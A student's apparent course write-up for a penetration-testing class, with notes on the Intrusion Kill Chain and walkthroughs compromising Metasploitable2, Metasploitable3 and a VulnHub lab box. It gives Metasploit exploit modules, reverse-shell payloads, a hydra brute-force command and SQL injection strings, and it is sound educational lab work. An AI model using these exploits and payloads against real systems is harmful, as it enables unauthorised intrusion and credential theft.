# H2

Solutions for second weeks assignments.


## Table of Contents

* [z) Notes from articles and videos](#z-notes-from-articles-and-videos)
* [a) Explain Cyber Kill Chain tooling](#a-explain-cyber-kill-chain-tooling)
* [b) Install and hack Metasploitable2](#b-install-and-hack-metasploitable2)
* [c) Install and hack a machine from VulnHub](#c-install-and-hack-a-machine-from-vulnhub)
* [d) Install and hack Metasploitable3](#d-install-and-hack-metasploitable3)

---

## z) Notes from articles and videos

### Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains

- Advanced Persistent Threats (APT) present the largest element of risk
  - APT actors compromise systems by using advanced tools, custom malware, and "zero-day" exploits that anti-virus and patching cannot detect or mitigate
- Kill Chain describes structure of the intrusions
- Intelligence-driven computer network defence (CND) is a risk management strategy
- Intrusion Kill Chain
  - systematic process to target and engage an adversary to create desired effects
  - derived from US military doctrine
  - Kill Chain Phases:
    - Reconnaissance
      - finding information like attack vectors
    - Weponization
      - create deliverable payload - creating a PDF document with embedded malicious code
    - Delivery
      - Delivering the weapon to target - sending an email with with the malicious pdf as an attachment
    - Exploitation
      - Trigger the payload - user clicking the attachment
    - Installation
      - Installing the exploit - running the code after user clicks the PDF attachment
    - Command and Control (C2)
      - Compromised targets will listen for instructions - malicious program in an exploited machine creates an outbound connection to IRC channel, so hostile actors can control the target
    - Actions on Objectives
      - Take actions on the targets - stealing data, destroy systems, espionage, etc.
  - chain fails, when any phase is not accomplished
- Defend against the Intrusion Kill Chain can be done by using the Courses of Action Matrix; Detect, Deny, Disrupt, Degrade, Deceive, Destroy
- Kill chain analysis is a guide for analysts to understand what information is, and may be, available for
defensive courses of action
- Defenders should collect as much data from intrusions - successful and unsuccessful
  - analysis of data from all phases so it's easier to protect against future attacks
  - identify commonalities and overlapping indicators
  - understand intruders intent
- Intelligence-driven computer network defence is a necessity
- The Intrusion Kill chain can be used to drive defensive actions
- Harder to hack systems -> less likely to be hacked

### Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit > Conducting a penetration test with Metasploit

- Basics of Metasploit
  - Exploits - exploit the target vulnerability
  - Payload - code to run on target after exploitation
  - Auxiliary - modules for additional functionalities, eg. scanning, fuzzing, sniffing, etc.
  - Encoders - obfuscates modules to avoid detection
  - Meterpreter - in memory payload
- Advantages on using Metasploit
  - open source
  - ease of use
  - smart payload generation and switching
  - cleaner exits from targets
- Case Study - reaching the domain controller
  - nmap smb-os-discovery script finds SMB vulnerability
  - EternalBlue exploit to gain access
  - Upgraded shell to Meterpreter
  - Found DC on another network
  - Used Mimikatz to get credentials
  - Found clear-text credentials of an admin user
  - Could've done much more

---

## a) Explain Cyber Kill Chain tooling

Using the example from Mastering Metasploit to describe Cyber Kill Chain phases and tooling

- Reconnaissance
  - Port scan with NMAP
- Weponization
  - Create deliverable payload with EternalBlue and reverse TCP shell
- Delivery - Deliver the weapon to target by sending a custom TCP packet with buffer overflow to SMBv1 server
- Exploitation
  - Payload triggers when the buffer overflow completes
- Installation
  - Reverse shell was installed in memory after exploitation
- Command and Control (C2)
  - from reverse shell we can command and control the target
- Actions on Objectives
  - act on the target by upgrading our shell to Meterpreter and grab user credentials with Mimikatz

---

## b) Install and hack Metasploitable2

- I accidently hacked Metasploitable3 first, but probably the same concepts work for Metasploitable2
- I started by logging into Metasploit console and scanning the target

    ```
    sudo msfdb init
    sudo msfconsole
    workspace -a h2-b
    db_nmap -Pn -sV 172.28.128.2
    ```

- Found FTP server running and wanted to try if that is vulnerable

    ```
    search vsftp
    exploit/unix/ftp/vsftpd_234_backdoor
    exploit
    ```

- got root access, but wanted to try something else. I noticed the server was running UnrealIRCd, which was new service for me. I seached for an exploit and wanted to try, if it would work

    ```
    search UnrealIRCd
    use exploit/unix/irc/unreal_ircd_3281_backdoor
    set payload cmd/unix/reverse
    exploit
    ```

- and again we got root really easily, which is quite scary

---

## c) Install and hack a machine from VulnHub

- I downloaded with [BlueMoon](https://www.vulnhub.com/entry/bluemoon-2021,679/) box from VulnHub and after some troubleshooting, got it in the same network as my Kali instance
-  I started by finding the instance on my network and scanning for interesting ports

    ```
    sudo msfdb init
    sudo msfconsole
    workspace -a h2-c
    nmap 172.28.128.0/24
    nmap -sV 172.28.128.8
    setg RHOSTS 172.28.128.8
    ```

- Target was running ftp, http and ssh, but none of the versions were vulnerable to known exploits
- I checked the http server from browser and it said nothing interesting. I tried to scan the directories on that website, but it found nothing interesting

    ```
    use auxiliary/scanner/http/dir_listing
    run

    use auxiliary/scanner/http/dir_scanner
    run

    use auxiliary/scanner/http/files_dir
    run
    ```

- I decided to try and brute force the ssh login with hydra

    ```
    hydra -l users.txt -P passwords.txt ssh://172.28.128.8
    ```

- I didn't get further than this, but I will continue and update my progress

---

## d) Install and hack Metasploitable3

- I created development setup on Vagrant, which has Metasploitable3(172.28.128.3) and Kali(172.28.128.3) instances, see [tools](../tools/)
- I logged into Kali machine and initiated the Metasploit database

    ```
    sudo msfdb init
    ```

- Then logged into Metasploit console

    ```
    sudo msfconsole
    ```

- created a workspace for me

    ```
    workspace -a h2-b
    ```

- then I started poking the Metasploitable instance with NMAP

    ```
    nmap -sV 172.28.128.3
    ```

- I noticed the open http port 80 and was curious about

    ```
    nmap -sV 172.28.128.3 -p 80
    ```

- It tells me that the server is running Apache httpd 2.4.7.
- Decided to take a look in the webpage by opening the http://172.28.128.3:80 in browser
- I noticed the payroll_app.php and clicked that
- It took me into login page and I just tried the first username and password combination(admin / admin), that came to my mind and it worked, but there was nothing, so I wanted to try another approach by using SQL injection
- I got in with ' or 'a' = 'a user and pass combination. There were salaries of Star Wars characters, which was not that interesting, so decided to try and see, if I can get more information from the database
- I queried all information from users table, and it got me all passwords and usernames

    ```
    ' OR 1=1; select * from users#
    ```

- SSH to the machine worked with the first user and password combination I tried and the user had sudo, so I got root already
- I wanted to try another approach, so I wanted to try the ftp server

    ```
    search ProFTPD 1.3.5
    ```

- Found an excellent exploit for that and checked, that the service is vulnerable for that exploit

    ```
    use exploit/unix/ftp/proftpd_modcopy_exec
    check
    ```

- Target was vulnerable so I needed to set options and run the exploit

    ```
    show options
    set SITEPATH /var/www/html
    set payload cmd/unix/reverse_python
    exploit
    ```

- I got reverse shell in the system, but I wanted to upgrade the shell to Meterpreter

    ```
    search shell_to_meterpreter
    use 0
    set LPORT 8080
    set SESSION 1
    exploit
    sessions 2
    ```

- now I had Meterpreter shell and working with the target was easier
- I browsed the html directory and found phpmyadmin/config.inc.php, which contained credentials to phpmyadmin and they worked
